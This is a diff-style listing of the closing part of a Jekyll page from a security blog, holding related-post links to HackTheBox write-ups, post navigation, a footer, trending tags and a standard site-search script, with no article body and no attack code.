+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  <aside id="related-posts" aria-labelledby="related-label">
+    <h3 class="mb-4" id="related-label">Further Reading</h3>
+    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
+      
+        <article class="col">
+          <a href="/posts/scriptkiddie/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1622844000"
+  data-df="ll"
+  
+>
+  Jun  5, 2021
+</time>
+
+              <h4 class="pt-0 my-2">HackTheBox - ScriptKiddie</h4>
+              <div class="text-muted">
+                <p>ScriptKiddie is an easy difficulty Linux HackTheBox machine based on known vulnerabilities for traditional hacking tools.</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/posts/delivery/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1621634400"
+  data-df="ll"
+  
+>
+  May 22, 2021
+</time>
+
+              <h4 class="pt-0 my-2">HackTheBox - Delivery</h4>
+              <div class="text-muted">
+                <p>Introduction Delivery is an easy difficulty Linux machine based on web sites enumeration and putting the pieces together in order to abuse a “by-design” function and get access to a restricted area...</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/posts/ready/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1620943200"
+  data-df="ll"
+  
+>
+  May 14, 2021
+</time>
+
+              <h4 class="pt-0 my-2">HackTheBox - Ready</h4>
+              <div class="text-muted">
+                <p>HackTheBox &quot;Ready&quot; wirteup is now available!</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+    </nav>
+  </aside>
+  <!-- #related-posts -->
+
+
+            
+              
+              <!-- Navigation buttons at the bottom of the post. -->
+
+<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
+  
+  
+
+  
+    <a
+      href="/posts/exploit-zip-slip-vulnerability-in-python-tarfile/"
+      class="btn btn-outline-primary"
+      aria-label="Older"
+    >
+      <p>Exploit Zip Slip vulnerability in python tarfile</p>
+    </a>
+  
+
+  
+    <a
+      href="/posts/routerspace/"
+      class="btn btn-outline-primary"
+      aria-label="Newer"
+    >
+      <p>HackTheBox - RouterSpace</p>
+    </a>
+  
+</nav>
+
+            
+
+            <footer
+  aria-label="Site Info"
+  class="
+    d-flex flex-column justify-content-center text-muted
+    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
+  "
+>
+  <p>©
+    <time>2026</time>
+
+    
+      <a href="https://github.com/0xb120">0xbro</a>.
+    
+
+    
+      <span
+        data-bs-toggle="tooltip"
+        data-bs-placement="top"
+        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
+      >Some rights reserved.</span>
+    
+  </p>
+
+  <p>
+   Powered by ☕, 🐛🐜🐞, vulnerabilities and exploits
+  </p>
+</footer>
+          </div>
+        </div>
+
+        <!-- The Search results -->
+
+<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
+  <div class="col-11 content">
+    <div id="search-hints">
+      <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
+      
+    </div>
+  </section>
+
+
+    </div>
+    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
+  </div>
+</div>
+
+      </div>
+
+      <aside aria-label="Scroll to Top">
+        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
+          <i class="fas fa-angle-up"></i>
+        </button>
+      </aside>
+    </div>
+
+    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>
+
+    
+      <aside
+  id="notification"
+  class="toast"
+  role="alert"
+  aria-live="assertive"
+  aria-atomic="true"
+  data-bs-animation="true"
+  data-bs-autohide="false"
+>
+  <div class="toast-header">
+    <button
+      type="button"
+      class="btn-close ms-auto"
+      data-bs-dismiss="toast"
+      aria-label="Close"
+    ></button>
+  </div>
+  <div class="toast-body text-center pt-0">
+    <p class="px-2 mb-3">A new version of content is available.</p>
+    <button type="button" class="btn btn-primary" aria-label="Update">
+      Update
+    </button>
+  </div>
+</aside>
+
+    
+
+    <!-- Embedded scripts -->
+
+    
+      
+      <!-- The comments switcher -->
+
+
+    
+
+    <!--
+  Jekyll Simple Search loader
+  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
+-->
+
+
+
+
+
+<script>
+  
+  document.addEventListener('DOMContentLoaded', () => {
+    SimpleJekyllSearch({
+      searchInput: document.getElementById('search-input'),
+      resultsContainer: document.getElementById('search-results'),
+      json: '/assets/js/data/search.json',
+      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
+      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
+      templateMiddleware: function(prop, value, template) {
+        if (prop === 'categories') {
+          if (value === '') {
+            return `${value}`;
+          } else {
+            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
+          }
+        }
+
+        if (prop === 'tags') {
+          if (value === '') {
+            return `${value}`;
+          } else {
+            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
+          }
+        }
+      }
+    });
+  });
+</script>
+
+  </body>
+</html>
+
